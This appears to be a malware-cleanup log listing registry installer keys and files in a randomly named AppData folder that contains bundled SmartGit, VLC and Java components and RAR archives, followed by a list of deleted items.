+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1B4B763F17FA9D246BA98E72C1084C37\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_description_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1E23925FBF0C0384785351CE8FE5BEC3\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_transcode_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1F240252A79BECC4FB01E252EC66C353\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\vcruntime140_1.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\2109DB1DA4E16B244B270748C8C43AC0\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgit-updater.exe
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\24020A892A469D84C9A372D44AB1ADFB\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-profile-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\251D3209D9CBDC942A2BC439D33ACECE\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_chromaprint_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\25BFDFC850840CB4381BA06E0FFBF8B4\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\chrome_elf.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\26842FBE0FAB6BA4BACFB1D6E583137D\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-string-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\2D70F4D12D156684A9D9D8724A598B66\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_standard_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\2E4795990073AB440BB6C6F57DEAD0BA\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-sysinfo-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\3234EAF45B31CE748B097BACAD0DEB3C\91759907F9AA3B04589E4CC67B83ADFA
+
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-string-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\3E3636B2B7C328D46ACE988AF07FEB78\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\icudtl.dat
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\424156D1A73CBD74C9DACF6E9371528F\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-time-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\4320AB981DCE03544801ED418AC2A9A6\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\4626984ED7F3B6344A68E5928829E076\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\guhwjvn.rar
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\578EA9D5186E56D429DF13DAFE553513\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\qt5gui.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\5916E8B659C179941904EDAE0AFBD7D1\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-math-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\5A03551116EBB8E44ABA9090327604C7\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgit.exe
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\5F24C1F5EC3A19848B0DCF0C0FE7D2A1\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-runtime-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\69C569D79CA614D43A453076B07E9CD6\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\cephtmlengine.exe
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6A1C1463346DA284D84148F8BDE33B6C\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_stats_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6B08689E3A73C3F49A9318851D17670C\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-private-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6CF8B66E0389CD347BF911452331C4CE\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\npvlc.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6EF7EF0C0C043D54FACE782DA7FE8D7A\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\git-cmd.exe
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\779C196EA1761B543BD42985BB73B140\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-process-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\7CC3E8CA514862340BB5B59FEDCB939B\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_autodel_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\846EB590FBEC86E47AA6673ADE50C7C9\91759907F9AA3B04589E4CC67B83ADFA
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\857DF55D255CE4D42A284C6582BE73BF\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\oneds.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\8862B1F7442771A498D70CCA9F1C0732\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_display_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\8B8DBA77F4D2A4943A9E94AA53849A9B\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-util-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\959CE1C30FA3E3F489271384E9FA017F\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_es_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\9955BAEA86366284492BBD14C0CA7540\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\libvlccore.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\9C59E2B7DD253084B9EE5A915A2B0BFA\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-filesystem-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\9FCC759CD560D744D843B85CEDC3FE7F\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-stdio-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\A3F338C4CFB240D45BA87F17AB2388A1\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\unrar.exe
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\A7AC97D32ED61FF46A1AAFCD6738A4CB\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libglesv2.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\AE7D5C46917892F4F8B80770F775155E\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-convert-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\AEE7EABB7D62F5E4F84DF38825D6D39B\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_cycle_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\AF101477B6524CC42B7C5D4819EBA43F\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_chromecast_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\B25D7F4205C76E34F9DA5AF3472E23C3\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_bridge_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\B78229F0B582A7B458B02531868C9DDF\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\jvm.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\BC4FDA02CA3EB6248A015A216F950E93\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_dummy_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C0BC157DFEBCB2A429CDB3B279FA13FA\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_setid_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C4890170E11986445A512DF2E8C5ACF3\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-synch-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C4B5677022BFA2A43916814D135AB196\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\axvlc.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C4E03DBC55A51534AB979CEB3DE90516\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\qt5core.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\CC772DFB05A714441B2ACDFC1580155D\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_smem_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\D020B29468DD70B45AAA4766DF12A057\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-synch-l1-2-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\D239F915D1C65404AA1FA7801CEDCC15\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-environment-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\D373BEF2F55F5934D9E4212E04C58DB6\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_rtp_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\DD2527F4B4565B649B70348502C3520D\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_duplicate_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\E0B413AB07149DA48A07C934074DF1DA\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_mosaic_bridge_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\E5DCF43EC19438D4E88E6EDA25C8E295\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_record_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\ECBAA78B077F33B4AA3DF3A7BDB2A3B1\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-timezone-l1-1-0.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\EED6ECF1469DE054BAFBC922DBF94EE3\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_gather_plugin.dll
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\F96E5E6976E687B4EAA970C84D385AF1\91759907F9AA3B04589E4CC67B83ADFA
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_delay_plugin.dll
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\assign prerequisites.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\assign resources.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\column options.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete column.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete row.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\duplicate.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\gigjcxobvj.rar
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\hide report.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert column.bmp
+
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert report.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert row.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.desktop.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.instrument.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.logging.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.management.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.management.rmi.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.naming.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.net.http.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.prefs.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.rmi.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.scripting.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.se.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.security.jgss.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.security.sasl.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.smartcardio.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.sql.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.sql.rowset.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.transaction.xa.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.xml.crypto.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.xml.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.accessibility.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.aot.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.attach.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.charsets.jmod
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move down.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move left.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move right.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move up.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\new project.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\pencil.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\pointer.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\report.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll left fast.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll left slow.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll right fast.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll right slow.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll to task.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\show hidden.bmp
+  c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out
+
+Deleted items:
+  [File] c:\windows\installer\a46df.msi
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\npvlc.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\unrar.exe
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\axvlc.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\qt5gui.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\pencil.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\report.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\guhwjvn.rar
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\git-cmd.exe
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\qt5core.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move up.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\pointer.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\git-bash.exe
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\msvcp140.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgit.exe
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.se.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.aot.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgitc.exe
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\duplicate.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.rmi.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.sql.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.xml.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move down.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move left.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\chrome_elf.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\libvlccore.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete row.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\gigjcxobvj.rar
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert row.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\move right.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\hide report.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.prefs.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.attach.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\new project.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\show hidden.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\vcruntime140.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.naming.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\cephtmlengine.exe
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\delete column.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert column.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\insert report.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.desktop.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.logging.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.charsets.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\vcruntime140_1.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\jvm.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\column options.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.net.http.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll to task.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.scripting.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\smartgit-updater.exe
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\oneds.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\assign resources.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.instrument.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.management.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.sql.rowset.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.xml.crypto.jmod
+
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll left fast.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll left slow.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\icudtl.dat
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.smartcardio.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll right fast.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\scroll right slow.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\jdk.accessibility.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.security.jgss.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.security.sasl.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libglesv2.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\assign prerequisites.bmp
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.management.rmi.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\java.transaction.xa.jmod
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-heap-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-time-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-math-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-conio-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-util-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-stdio-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-locale-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-string-l1-1-0.dll
